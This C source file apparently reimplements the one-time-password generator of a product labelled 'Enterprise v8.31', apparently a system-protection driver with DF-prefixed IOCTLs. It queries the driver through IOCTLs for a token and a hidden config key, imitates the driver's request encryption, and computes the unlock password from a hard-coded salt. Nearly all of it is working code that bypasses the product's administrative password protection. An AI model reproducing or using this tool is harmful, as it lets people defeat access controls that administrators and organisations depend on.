#include <stdint.h>
#include <Windows.h>
#include "errors.h"
#include "ioctl.h"
#include "shared.h"

// Offset of the key
#define KEY_OFFSET (0x289)
// Const value sent in config (size) requests
#define REQUEST_CONST (0x6789EFDC)

#pragma pack(push,1)
/**
 * The request sent to request the Enterprise config data size.
 * ioctl: IOCTL_DF_CCH_SIZE_REQ
 */
typedef struct {
	uint32_t unknown_1;
	uint32_t token;
	uint32_t const_value;
	uint32_t unknown_2;
} ent_conf_size_req_t;
#pragma pack(pop)

#pragma pack(push,1)
/**
 * The request sent to request the Enterprise config data which contains the
 * CCH token.
 * ioctl: IOCTL_DF_CCH_REQ
 */
typedef struct {
	struct {
		uint32_t token;
		uint8_t unk_data_1[0x7E];
		uint32_t unknown_1;
		uint8_t unk_data_2[0x8];
		uint32_t struct_size;
	} head;
	struct {
		uint32_t token;
		uint32_t const_value;
		uint32_t struct_size;
	} tail;
} ent_conf_req_t;
#pragma pack(pop)

static void OTP_InitConfigRequest(ent_conf_req_t *request, uint32_t token)
{
	memset(request, 0, sizeof(*request));
	request->head.token = token;
	request->head.unknown_1 = 1;
	request->head.struct_size = sizeof(request->head); // Should be 0x92
	request->tail.const_value = REQUEST_CONST;
	request->tail.token = token;
	request->tail.struct_size = sizeof(request->tail); // Should be 0xC
}

static void OTP_InitConfigSizeRequest(ent_conf_size_req_t *request, uint32_t token)
{
	memset(request, 0, sizeof(*request));
	request->token = token;
	request->const_value = REQUEST_CONST;
}

// Relevant to: Enterprise v8.31
uint16_t OTP_GetNextIOControlSeed(uint16_t seed)
{
	return (((seed % 0xAD) * 0x89) - ((seed / 0xAD) * 2)) * -1;
}

void OTP_Encrypt(uint8_t *dest, const uint8_t *src, size_t size)
{
	Encrypt(dest, src, size, OTP_GetNextIOControlSeed);
}

void OTP_PreEncrypt(uint8_t *dest, const uint8_t *src, size_t size)
{
	uint8_t i, temp = 0xBC;
	for (i = 0; i < size; i++, temp++)
		dest[i] = src[i] ^ temp ^ i;
}

uint32_t OTP_CR(const char *str)
{
	uint32_t v4, v5, result = 0;

	while (*str != 0) {
		v5 = (result << 4) + *str;
		v4 = v5 & 0xF0000000;
		if (v4 != 0)
			v5 ^= (v4 >> 24);
		result = ~v4 & v5;
		str++;
	}

	return result;
}

int32_t OTP_HL(int32_t src)
{
	return 32767 * (171 * (src % 177) - 2 * (src / 177));
}

void OTP_PWD(uint8_t *dest, size_t size, uint32_t token, uint32_t cch)
{
	uint32_t v5;
	uint16_t v6, v9, v10;

	v5 = cch ^ token ^ OTP_CR("igor zagoruchenko");
	v6 = v5 >> 0x10;
	v5 &= 0xFFFF;
	if (cch != 0) {
		v10 = OTP_HL(v5 ^ v6);
		v9 = v5 ^ OTP_HL(v6);
	} else {
		v10 = OTP_HL(v5);
		v9 = OTP_HL(v6);
	}

	_snprintf(dest, size, "%.04X%.04X", v10, v9);
}

int OTP_Generate(uint8_t *dest, size_t size, uint32_t cch, uint32_t token)
{
	char pass[16], pass_lower[16], prefix[9];
	uint32_t prefix_value;
	// Setup password
	OTP_PWD(pass, 16, token, cch);
	strlower(pass_lower, pass);
	// Setup prefix
	prefix_value = OTP_CR(pass_lower);
	_snprintf(prefix, 9, "%X", prefix_value);
	prefix[4] = '\0';
	// Format together
	_snprintf(dest, size, "%s-%s", prefix, pass);
	return 0;
}

BOOL OTP_RequestToken(uint32_t *token)
{
	HANDLE hDrive;
	uint8_t buffer[0x104];
	uint32_t recv_count;

	hDrive = OpenVolume();
	if (hDrive == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!DeviceIoControl(hDrive, IOCTL_DF_TOKEN_REQ,
		NULL, 0,
		buffer, 0x104,
		&recv_count, NULL)) {
		CloseHandle(hDrive);
		return FALSE;
	}

	buffer[8] = '\0';
	// Buffer should now be a hex string
	if (!ParseHex(token, buffer)) {
		CloseHandle(hDrive);
		return FALSE;
	}

	CloseHandle(hDrive);
	return TRUE;
}

/**
 * Communicates with the driver to get key necessary to generate the OTP.
 * Relevant to: Enterprise v8.31
 */
int OTP_RequestCCH(uint32_t *key, uint32_t token)
{
	HANDLE hDrive;
	uint32_t buffer_size, recv_count;
	ent_conf_req_t request;
	ent_conf_size_req_t size_request;
	uint8_t *config, *req_b, *size_req_b;

	// Initialize the request structs
	OTP_InitConfigRequest(&request, token);
	OTP_InitConfigSizeRequest(&size_request, token);
	req_b = (uint8_t*)&request;
	size_req_b = (uint8_t*)&size_request;

	hDrive = OpenVolume();
	if (hDrive == INVALID_HANDLE_VALUE) {
		return ERR_OPEN_VOLUME;
	}

	OTP_Encrypt(size_req_b, size_req_b, sizeof(size_request));
	if (!DeviceIoControl(hDrive, IOCTL_DF_CCH_SIZE_REQ,
		size_req_b, sizeof(size_request),
		&buffer_size, 4,
		&recv_count, NULL)) {
		CloseHandle(hDrive);
		return ERR_IOCTL_GET_CONFIG_SIZE;
	}

	if (!IsGoodBufferSize(buffer_size)) {
		CloseHandle(hDrive);
		return ERR_IOCTL_BUFFER_SIZE;
	}

	// Allocate enough memory for the config data
	config = (uint8_t*)malloc(sizeof(uint8_t) * buffer_size);
	if (config == NULL) {
		CloseHandle(hDrive);
		return ERR_MALLOC;
	}

	OTP_PreEncrypt(req_b, req_b, 0x92);
	OTP_Encrypt(req_b, req_b, sizeof(request));
	if (!DeviceIoControl(hDrive, IOCTL_DF_CCH_REQ,
		req_b, sizeof(request),
		config, buffer_size,
		&recv_count, NULL)) {
		free(config);
		CloseHandle(hDrive);
		return ERR_IOCTL_GET_CONFIG;
	}

	*key = *(uint32_t*)(config + KEY_OFFSET);
	free(config);
	CloseHandle(hDrive);

	return 0;
}
